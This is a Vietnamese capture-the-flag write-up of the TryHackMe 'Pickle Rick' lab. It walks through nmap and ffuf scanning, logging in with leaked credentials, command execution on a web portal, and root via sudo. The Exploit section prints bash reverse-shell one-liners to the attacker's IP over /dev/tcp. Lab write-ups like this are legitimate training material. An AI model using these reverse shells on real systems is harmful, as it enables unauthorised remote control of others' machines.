# [THM] Pickle Rick write-up

- IP: 10.10.226.237

## Recon

Sử dụng nmap để dò quét các cổng và dịch vụ đang mở
> nmap -sT -sV -sC -T4 10.10.226.237

<p align="center">
  <img src="./img/nmap-scan.png" alt="robots.txt">
</p>

Có 2 port dịch vụ đang mở bao gồm
- Port 22 chạy dịch vụ SSH
- Port 80 chạy dịch vụ HTTP 

Truy cập với port 80 xem có giao diện như bên dưới

![Web interface](./img/web-interface.png)

Source code của giao diện trên đã thấy điều khả nghi đó là username 

![Web source](./img/web-source.png)

Tiếp tục scan thư mục ẩn với công cụ ffuf để xem có gì khai thác được với username bên trên không

> ffuf -u "http://10.10.226.237/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -e .php,.phtml,.txt

<p align="center">
  <img src="./img/ffuf-scan.png" alt="ffuf scan">
</p>

Nhận thấy có tệp `robots.txt`,`denied.php `,`login.php`, `portal.php` và thư mục `/assets` là thư mục ẩn, truy cập các tệp và thư mục đó xem sao

`robots.txt` có điều đặc biệt có thể là mật khẩu của user trên chăng?

<p align="center">
  <img src="./img/robots-txt.png" alt="robots.txt">
</p>

## Exploit
Tiếp đến ta sẽ truy cập tới `/login.php` 
<p align="center">
    <img src="./img/login-interface.png" alt="Login interface">
</p>

Sau khi truy cập thì hiển thị ra giao diện bên dưới, sử dụng những thông tin đã thu thập được ta sẽ đăng nhập. Đăng nhập thành công đã được redirect sang `/portal.php`
<p align="center">
    <img src="./img/portal-page.png" alt="Portal interface">
</p>

Có vẻ như input này nhập được command và thực thi được 1 số câu lệnh, thử nhập một số câu lệnh như `ls`, `whoami` đã nhận được kết quả như hình bên dưới
<p align="center">
    <img src="./img/ls-command.png" alt="ls command">
</p>
<p align="center">
    <img src="./img/whoami-command.png" alt="whoami command">
</p>

Nhưng có chút vấn đề là khi ta muốn `cat` một số file trong đây thì đều không được
<p align="center">
    <img src="./img/cat-command.png" alt="cat command">
</p>

Vậy thì ta sẽ thử kiểm tra xem trên server có khả dụng với `bash` không với câu lệnh `which bash`
<p align="center">
    <img src="./img/bash-command.png" alt="bash command">
</p>

Thật tuyệt khi trên server khả dụng đối với câu lệnh bash, ta sẽ nghĩ ngay tới `reverse shell` để khai thác. Ta sẽ tạo reverse shell trên [revshells.com](https://www.revshells.com/)

<p align="center">
    <img src="./img/reverse-shell.png" alt="reverse shell">
</p>

Tạo **Netcad listener** trên máy attacker lắng nghe port 1234 và nhập reverse shell vào ô input
```sh
bash -i >& /dev/tcp/10.21.113.26/1234 0>&1
```
Nhưng sau khi chạy câu lệnh trên ta vẫn không nhận được shell vậy thì ta sẽ thử đặt nó trong 1 **subshell** xem có thành công hay không
```sh
bash -c 'bash -i >& /dev/tcp/10.21.113.26/1234 0>&1'
```

Ta đã nhận được user shell sau khi chạy câu lệnh trên
<p align="center">
    <img src="./img/user-shell.png" alt="User shell">
</p>

## First ingredient
Sau khi chiếm được user shell ta đã tìm kiếm được file `Sup3rS3cretPickl3Ingred.txt` chứa nguyên liệu đầu tiên mà Rick cần, và file `clue.txt` đã cho ta thông tin để tìm kiếm các file khác trong hệ thống để tìm được những nguyên liệu tiếp theo
<p align="center">
    <img src="./img/question-1.png" alt="First ingredient">
</p>

## Second ingredient
Tìm kiếm và nhận ra nguyên liệu thứ 2 nằm trong file `/home/rick/second ingredients`
<p align="center">
    <img src="./img/question-2.png" alt="Second ingredient">
</p>

## Privilege escalation
Sau một hồi tìm kiếm khả năng cao là sẽ cần leo thang đặc quyền để có thể truy cập vào thư mục `root`. Kiểm tra xem user hiện tại có tác vụ nào chạy với quyền root không ta sử dụng câu lệnh `sudo -l`
<p align="center">
    <img src="./img/sudo-l.png" alt="Sudo -l">
</p>

Tuyệt vời user hiện tại có quyền chạy bất kì tác vụ nào với quyền `root`

## Last ingredient
Không nằm ngoài dự đoán nguyên liệu cuối cùng đã được tìm thấy trong thư mục `/root`
<p align="center">
    <img src="./img/question-3.png" alt="Last ingredient">
</p>


DONE









